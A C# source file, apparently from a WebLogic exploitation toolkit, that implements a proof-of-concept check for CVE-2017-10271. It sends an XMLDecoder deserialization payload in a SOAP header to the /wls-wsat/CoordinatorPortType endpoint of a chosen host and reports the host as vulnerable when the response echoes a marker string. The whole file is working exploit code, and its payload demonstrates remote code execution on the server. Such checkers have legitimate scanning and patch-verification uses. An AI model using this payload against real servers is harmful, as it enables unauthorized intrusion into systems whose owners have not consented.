using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.IO;

namespace WeblogicRCE.WeblogicPOC
{
    class CVE_2017_10271_POC
    {
        public static void Check(string ip, int port)
        {
            string payload = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Header><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java><void class=\"java.lang.Thread\" method=\"currentThread\"><void method=\"getCurrentWork\"><void method=\"getResponse\"><void method=\"getServletOutputStream\"><void method=\"writeStream\"><object idref=\"proc\"></object></void><void method=\"flush\"/></void>";
            payload += "<void method=\"getWriter\"><void method=\"write\"><string>WeblogicRCE Demo</string></void></void>";
            payload += "</void></void></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>";

            string url = "http://" + ip +":"+ port+ "/wls-wsat/CoordinatorPortType";
            Requests_CVE_2017_10271_POC(url, payload);
        }

        private static void Requests_CVE_2017_10271_POC(string url, string data)
        {
            WebRequest WebRequest = (WebRequest)WebRequest.Create(url);
            WebRequest.Method = "POST"; 
            WebRequest.ContentType = "text/xml";
            WebRequest.Proxy = null;

            byte[] bytes = Encoding.ASCII.GetBytes(data);
            WebRequest.ContentLength = (long)bytes.Length;
            try
            {
                Stream requestStream = WebRequest.GetRequestStream();
                requestStream.Write(bytes, 0, bytes.Length);
                Console.WriteLine("  [>] Sending Payload");
                requestStream.Close();
                try
                {
                    HttpWebResponse httpWebResponse = (HttpWebResponse)WebRequest.GetResponse();
                    Stream myResponseStream = httpWebResponse.GetResponseStream();
                    StreamReader myStreamReader = new StreamReader(myResponseStream, Encoding.UTF8);
                    string recStr = myStreamReader.ReadToEnd();
                    if (recStr.Contains("WeblogicRCE Demo"))
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("  [>] Is Vulnerability CVE-2017-10271 ");
                        Console.ForegroundColor = ConsoleColor.White;
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("  [!] Not Vulnerability CVE-2017-10271 ");
                        Console.ForegroundColor = ConsoleColor.White;
                    }
                    myStreamReader.Close();
                    myResponseStream.Close();
                }
                catch (WebException ex)
                {
                    Console.WriteLine("[-] 请检查当前网络与目标 Weblogic 连接状态" + ex);
                }
            }
            catch (WebException ex)
            {
                Console.WriteLine("[-] 请检查当前网络与目标 Weblogic 连接情况" + ex);
            }
        }

    }
}
